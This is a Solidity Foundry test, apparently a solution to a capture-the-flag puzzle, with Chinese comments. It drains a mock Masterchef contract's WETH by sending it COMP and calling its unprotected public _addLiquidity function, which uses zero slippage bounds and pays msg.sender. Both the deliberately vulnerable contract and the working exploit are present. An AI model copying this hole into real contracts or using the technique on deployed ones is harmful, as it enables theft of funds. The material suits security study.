// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// 我们模拟题目：假设masterchef一开始拥有10WETH，我们需要将它归零，任何人可以调用它的_addLiquidity来添加流动性
// 因此，我们打算用一种叫做COMP的ERC20代币，送给masterchef一定数量的COMP，
// 然后调用_addLiquidity给COMP/WETH池子添加流动性，这样就可以将masterchef的WETH归零

contract rescurTest is Test {

    WETH9 comp = WETH9(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    WETH9 weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    Masterchef public masterchef;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_401_180);
        vm.label(address(comp), "comp");
        vm.label(address(weth), "weth");
        vm.label(address(router), "router");
        vm.label(address(masterchef), "masterchef");
    }

    function test_setToZero() public payable{

        // 此时masterchef合约拥有10WETH，我们需要将他归零
        masterchef = new Masterchef();
        weth.deposit{value: 10}();
        weth.transfer(address(masterchef), 10); 

        // 用一个拥有COMP的账户给masterchef转1000的COMP，根据本区块中的币对比例，1000COMP完全可以换10WETH
        vm.startPrank(0x2775b1c75658Be0F640272CCb8c72ac986009e38);
        comp.transfer(address(masterchef),1000);
        vm.stopPrank();

        // 检查masterchef是否有10 WETH
        assertEq(weth.balanceOf(address(masterchef)),10);
        console.log("[before] WETH",weth.balanceOf(address(masterchef)));
        
        // 检查masterchef是否有 1000 COMP
        assertEq(comp.balanceOf(address(masterchef)),1000);
        console.log("[before] COMP",comp.balanceOf(address(masterchef)));

        // 添加流动性，这会使我们换走所有的token0，即WETH
        masterchef._addLiquidity(address(weth), address(comp), 0);

        // 检查masterchef的WETH是否为0，并且COMP会有剩余
        assertEq(weth.balanceOf(address(masterchef)),0);
        console.log("[after] WETH",weth.balanceOf(address(masterchef)));
        console.log("[after] COMP",comp.balanceOf(address(masterchef)));
    }
}

contract Masterchef{
    Uni_Router_V2 router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function _addLiquidity(address token0, address token1, uint256 minAmountOut) public {
        WETH9(token0).approve(address(router),type(uint256).max);
        WETH9(token1).approve(address(router),type(uint256).max);
    (,, uint256 amountOut) = router.addLiquidity(
        token0, 
        token1, 
        WETH9(token0).balanceOf(address(this)), 
        WETH9(token1).balanceOf(address(this)), 
        0, 
        0, 
        msg.sender, 
        block.timestamp
    );
    require(amountOut >= minAmountOut);
    }
}